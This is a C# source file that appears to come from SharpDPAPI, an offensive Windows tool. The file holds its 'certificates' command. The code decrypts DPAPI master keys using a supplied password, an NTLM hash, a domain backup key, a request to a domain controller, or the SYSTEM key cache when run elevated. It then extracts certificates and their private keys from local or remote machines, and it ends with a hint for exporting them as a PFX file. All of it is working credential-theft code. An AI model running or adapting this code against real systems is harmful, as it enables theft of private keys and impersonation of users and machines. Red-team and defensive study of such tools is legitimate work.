using System;
using System.Collections.Generic;
using System.IO;

namespace SharpDPAPI.Commands
{

    public class Certificate : ICommand
    {
        public static string CommandName => "certificates";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Certificate Triage");
            arguments.Remove("certificates");

            string server = "";         // used for remote server specification
            bool cng = false;           // used for CNG certs
            bool showall = false;       // used for CNG certs
            bool unprotect = false;     // whether to force CryptUnprotectData()

            if (arguments.ContainsKey("/server"))
            {
                server = arguments["/server"];
            }

            if (arguments.ContainsKey("/unprotect"))
            {
                Console.WriteLine("\r\n[*] Using CryptUnprotectData() for decryption.");
                unprotect = true;
            }
            Console.WriteLine();

            // {GUID}:SHA1 keys are the only ones that don't start with /
            Dictionary<string, string> masterkeys = new Dictionary<string, string>();
            foreach (KeyValuePair<string, string> entry in arguments)
            {
                if (!entry.Key.StartsWith("/"))
                {
                    masterkeys.Add(entry.Key, entry.Value);
                }
            }

            if (arguments.ContainsKey("/cng"))
            {
                cng = true;
            }

            if (arguments.ContainsKey("/showall"))
            {
                showall = true;
            }

            if (arguments.ContainsKey("/machine"))
            {
                // machine certificate triage
                if (arguments.ContainsKey("/mkfile"))
                {
                    masterkeys = SharpDPAPI.Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
                }

                if (arguments.ContainsKey("/target"))
                {
                    string target = arguments["/target"].Trim('"').Trim('\'');

                    if (masterkeys.Count == 0)
                    {
                        Console.WriteLine("\r\n[X] Either a '/mkfile:X' or {GUID}:key needs to be passed in order to use '/target' for machine masterkeys");
                    }
                    else
                    {
                        if (File.Exists(target))
                        {
                            Console.WriteLine("[*] Target Certificate File: {0}\r\n", target);
                            Triage.TriageCertFile(target, masterkeys, cng, showall);
                        }
                        else if (Directory.Exists(target))
                        {
                            Console.WriteLine("[*] Target Certificate Folder: {0}\r\n", target);
                            Triage.TriageCertFolder(target, masterkeys, cng, showall);
                        }
                        else
                        {
                            Console.WriteLine("\r\n[X] '{0}' is not a valid file or directory.", target);
                        }
                    }
                }
                else
                {
                    if (masterkeys.Count == 0)
                    {      
                        // if no /target and no masterkeys, try to extract the SYSTEM DPAPI creds
                        if (!Helpers.IsHighIntegrity())
                        {
                            Console.WriteLine("[X] Must be elevated to triage SYSTEM DPAPI Credentials!");
                        }
                        else
                        {
                            masterkeys = Triage.TriageSystemMasterKeys();

                            Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                            foreach (KeyValuePair<string, string> kvp in masterkeys)
                            {
                                Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                            }
                            Console.WriteLine();

                            Triage.TriageSystemCerts(masterkeys);
                        }
                    }
                    else
                    {
                        // if we got machine masterkeys somehow else
                        Console.WriteLine(masterkeys.Count);
                        Triage.TriageSystemCerts(masterkeys);
                    }
                }
            }
            else
            {
                // user triage

                if (arguments.ContainsKey("/pvk"))
                {
                    // use a domain DPAPI backup key to triage masterkeys
                    masterkeys = SharpDPAPI.Dpapi.PVKTriage(arguments);
                }
                else if (arguments.ContainsKey("/mkfile"))
                {
                    masterkeys = SharpDPAPI.Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
                }
                else if (arguments.ContainsKey("/password"))
                {
                    Console.WriteLine("[*] Will decrypt user masterkeys with password: {0}\r\n", arguments["/password"]);
                    masterkeys = Triage.TriageUserMasterKeys(show: true, computerName: server, password: arguments["/password"]);
                }
                else if (arguments.ContainsKey("/ntlm"))
                {
                    Console.WriteLine("[*] Will decrypt user masterkeys with NTLM hash: {0}\r\n", arguments["/ntlm"]);
                    masterkeys = Triage.TriageUserMasterKeys(show: true, computerName: server, ntlm: arguments["/ntlm"]);
                }
                else if (arguments.ContainsKey("/credkey"))
                {
                    Console.WriteLine("[*] Will decrypt user masterkeys with credkey: {0}\r\n", arguments["/credkey"]);
                    masterkeys = Triage.TriageUserMasterKeys(show: true, computerName: server, credkey: arguments["/credkey"]);
                }
                else if (arguments.ContainsKey("/rpc"))
                {
                    Console.WriteLine("[*] Will ask a domain controller to decrypt masterkeys for us\r\n");
                    masterkeys = Triage.TriageUserMasterKeys(show: true, rpc: true);
                }

                if (arguments.ContainsKey("/server"))
                {
                    server = arguments["/server"];
                    Console.WriteLine("[*] Triaging Certificates from remote server: {0}\r\n", server);
                    Triage.TriageUserCerts(masterkeys, server, showall);
                }

                if (arguments.ContainsKey("/target"))
                {
                    string target = arguments["/target"].Trim('"').Trim('\'');

                    if (File.Exists(target))
                    {
                        Console.WriteLine("[*] Target Certificate File: {0}\r\n", target);
                        Triage.TriageCertFile(target, masterkeys, cng, showall, unprotect);
                    }
                    else if (Directory.Exists(target))
                    {
                        Console.WriteLine("[*] Target Certificate Folder: {0}\r\n", target);
                        Triage.TriageCertFolder(target, masterkeys, cng, showall, unprotect);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] '{0}' is not a valid file or directory.", target);
                    }
                }
                else
                {
                    Triage.TriageUserCerts(masterkeys, "", showall, unprotect);
                }
            }

            Console.WriteLine("\r\n[*] Hint: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx");
        }
    }
}